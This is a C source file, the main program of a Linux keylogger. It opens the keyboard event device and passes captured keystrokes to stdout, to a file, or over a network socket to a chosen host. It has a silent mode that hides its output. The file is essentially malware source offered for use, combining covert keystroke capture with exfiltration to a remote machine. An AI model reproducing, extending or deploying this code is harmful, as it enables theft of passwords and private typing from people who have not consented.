#include <stdio.h>
#include <stdbool.h>
#include <getopt.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include "keylogger.h"
#include "networking.h"
#include "find_event_file.h"

#define PORT "3491"

void print_usage_and_quit(char *application_name);
void print_help_and_quit(char *application_name);

int main(int argc, char *argv[]){
  int writeout, option, keyboard, option_index = 0;
  bool network, file, releasedKeys;
  char *option_input = NULL;
  char *port_num = PORT;
    
  option = writeout = 0;
  releasedKeys = network = file = false;
  
    
  static struct option long_options[] = {
    {"silent",   no_argument,       0,  's'},
    {"released", no_argument,       0,  'r'},
    {"help",     no_argument,       0,  'h'},
    {"port",     no_argument,       0,  'p'},
    {"network",  required_argument, 0,  'n'},
    {"out",      required_argument, 0,  'o'},
    {0,          0,                 0,   0 }
  };
    
  while((option = getopt_long(argc, argv,"srhp:n:o:", long_options, &option_index)) != -1)
    {
      switch(option){
      case 's':
	if (freopen("/dev/null", "w", stdout) == NULL)
	  perror("Failed to redirect stdout to /dev/null");
	
	if (freopen("/dev/null", "w", stderr) == NULL)
	  perror("Failed to redirect stderr to /dev/null");
	
	break;
      case 'n':
	network = true;
	option_input = optarg;
	break;
      case 'o':
	file = true;
	option_input = optarg;
	break;
      case 'r':
	releasedKeys = true;
	break;
      case 'p':
	port_num = optarg;
	break;
      case 'h':
	print_help_and_quit(argv[0]);
	break;
      default: print_usage_and_quit(argv[0]);
      }
    }


  if(network && file){
    /* AND, If both mode arguments are provided... */
    print_usage_and_quit(argv[0]);

  } else if(file) {
    if (strncmp(option_input, "-", 1) == 0) {
      writeout = dup(STDOUT_FILENO);
    } else {
      if((writeout = open(option_input, O_WRONLY|O_APPEND|O_CREAT, S_IROTH)) < 0){
	printf("Error opening file %s: %s\n", argv[2], strerror(errno));
	return 1;
      }
    }
	
  } else if(network){
    writeout = get_socket_file_descriptor(option_input, port_num);
    if(writeout < 0){
      printf("Error creating socket on %s\n", option_input);
      return 1;
    }
  } else {
    /* NOR, If neither mode argument is provided */
    writeout = dup(STDOUT_FILENO);
  }


  char *KEYBOARD_DEVICE = get_keyboard_event_file();
  if(!KEYBOARD_DEVICE){
    print_usage_and_quit(argv[0]);
  }

  if((keyboard = open(KEYBOARD_DEVICE, O_RDONLY)) < 0){
    printf("Error accessing keyboard from %s. May require you to be superuser\n", KEYBOARD_DEVICE);
    return 1;
  }

  keylogger(keyboard, writeout, releasedKeys);
    
  close(keyboard);
  close(writeout);
  free(KEYBOARD_DEVICE);

  return 0;
}

void print_help_and_quit(char *application_name){
  printf("Usage: %s [OPTION]... \n", application_name);
  fputs("\
Log keys on a Linux system to a file or specified host.\n\
  -s         --silent          do not log keys to terminal\n\
  -n host    --network host    log keys to specified host\n\
  -p         --port            specify port number other than 3491\n\
  -o outfile --out outfile     log keys to specified file.\n\
  -r         --released        log when a key has been released\n\
", stdout);
  exit(1);
}

void print_usage_and_quit(char *application_name){
  printf("Try: '%s --help' for more information.\n", application_name);
  exit(1);
}
